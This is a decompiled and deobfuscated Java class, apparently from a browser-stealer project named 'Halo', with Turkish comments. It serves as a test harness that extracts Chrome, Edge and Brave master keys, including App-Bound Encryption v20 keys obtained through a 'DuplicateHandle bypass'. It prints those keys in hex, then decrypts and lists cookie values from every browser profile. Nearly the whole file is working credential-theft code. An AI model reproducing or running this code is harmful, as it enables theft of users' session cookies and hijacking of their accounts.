/*\n * ========================================\n * DEOBFUSCATED: AbeTestHarness.java\n * Original: c/q.java\n * ----------------------------------------\n * ABE cookie çözme test aracı (debug)\n * ========================================\n */\n\n/*
 * Decompiled with CFR 0.152.
 */
package c;

import c.e;
import c.e$Info;
import c.f;
import c.g$MasterKeys;
import c.l;
import c.l$Cookie;
import c.o;
import java.util.HexFormat;
import java.util.List;

public final class q {
    public static void main(String[] stringArray) {
        System.out.println("=== Halo ABE Cookie Test (no kill) ===");
        System.out.println("[info] tarayici acik birakildi \u2014 DuplicateHandle bypass kullaniliyor");
        e$Info[] e$InfoArray = new e$Info[]{e$Info.GOOGLE_CHROME, e$Info.MICROSOFT_EDGE, e$Info.BRAVE};
        int n2 = 0;
        int n3 = 0;
        for (e$Info e$Info : e$InfoArray) {
            f[] fArray;
            e e2;
            g$MasterKeys g$MasterKeys;
            if (!e$Info.getDataDirectory().isDirectory()) {
                System.out.println("[skip] " + e$Info.getBrowserName() + " - no data dir");
                continue;
            }
            System.out.println("\n--- " + e$Info.getBrowserName() + " ---");
            if (e$Info == e$Info.BRAVE) {
                try {
                    System.out.println("abe exe: " + o.resolveBrowserExe(e$Info.getAbeKey()));
                }
                catch (Exception exception) {
                    System.out.println("abe exe: " + exception.getMessage());
                }
            }
            if (!(g$MasterKeys = (e2 = new e(e$Info)).getMasterKeys()).hasAny()) {
                System.out.println("keys: MISSING");
                continue;
            }
            if (g$MasterKeys.a != null && g$MasterKeys.a.length == 32) {
                System.out.println("v10: " + HexFormat.of().formatHex(g$MasterKeys.a));
            }
            if (g$MasterKeys.b != null && g$MasterKeys.b.length == 32) {
                System.out.println("v20: " + HexFormat.of().formatHex(g$MasterKeys.b));
            }
            if ((fArray = e2.getProfiles()) == null) {
                System.out.println("profiles: none");
                continue;
            }
            for (f f2 : fArray) {
                l l2 = f2.getDataCookies();
                int n4 = l2.getCount();
                n2 += n4;
                System.out.println("profile " + f2.getDirectory().getName() + ": " + n4 + " cookies");
                List<l$Cookie> list = l2.getCookies();
                int n5 = 0;
                for (l$Cookie l$Cookie : list) {
                    String string = l$Cookie.getValue();
                    if (string == null || string.isEmpty() || string.startsWith("[Encrypted") || string.matches("^[A-Za-z0-9+/=]{20,}$")) continue;
                    ++n3;
                    if (n5 >= 3) continue;
                    System.out.println("  " + l$Cookie.getDomain() + " | " + l$Cookie.getName() + " = " + q.abbrev(string, 48));
                    ++n5;
                }
            }
        }
        System.out.println("\n=== SUMMARY ===");
        System.out.println("total cookies: " + n2);
        System.out.println("decrypted cookies: " + n3);
        System.out.println(n3 > 0 ? "SUCCESS" : "FAIL (no decrypted cookies)");
    }

    private static String abbrev(String string, int n2) {
        if (string.length() <= n2) {
            return string;
        }
        return string.substring(0, n2) + "...";
    }
}

